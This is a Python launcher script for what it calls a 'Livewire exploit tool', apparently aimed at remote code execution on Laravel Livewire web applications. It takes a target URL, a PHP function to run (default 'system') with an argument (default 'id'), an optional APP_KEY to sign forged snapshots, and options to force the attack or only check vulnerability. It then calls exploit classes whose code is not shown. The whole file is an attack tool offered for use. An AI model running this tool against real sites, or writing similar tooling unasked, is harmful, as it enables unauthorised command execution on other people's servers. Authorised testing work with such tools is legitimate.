#!/usr/bin/env python3

import argparse
import warnings
warnings.filterwarnings("ignore")

from exploit.exploit_appkey import ExploitWithAppKey
from exploit.exploit_wappkey import ExploitWithoutAppKey

def main():
    parser = argparse.ArgumentParser(description="Livewire exploit tool")
    parser.add_argument("-u", "--url", help="Target URL", required=True)
    parser.add_argument("-f", "--function", help="Function to execute (default: system)", default="system")
    parser.add_argument("-p", "--param", help="Param for function (default: id)", default="id")
    parser.add_argument("-H", "--headers", help="Headers to add to the request (default None)", default=None, action="append")
    parser.add_argument("-P", "--proxy", help="Proxy URL for requests", default=None)
    parser.add_argument("-a", "--app-key", help="APP_KEY to sign snapshot", default=None)
    parser.add_argument("-d", "--debug", help="Enable debug output", action="store_true")
    parser.add_argument("-F", "--force", help="Force exploit even if version does not seems to be vulnerable", action="store_true")
    parser.add_argument("-c", "--check", help="Only check if the remote target is vulnerable (only revelant for the exploit without the APP_KEY)", action="store_true")

    args = parser.parse_args()
    if args.app_key is not None:
        exploit = ExploitWithAppKey(args.url, args.debug, args.function, args.param, args.headers, args.proxy, args.app_key)
    else:
        exploit = ExploitWithoutAppKey(args.url, args.debug, args.function, args.param, args.headers, args.proxy, args.check, args.force)
    exploit.run()

if __name__ == "__main__":
    main()
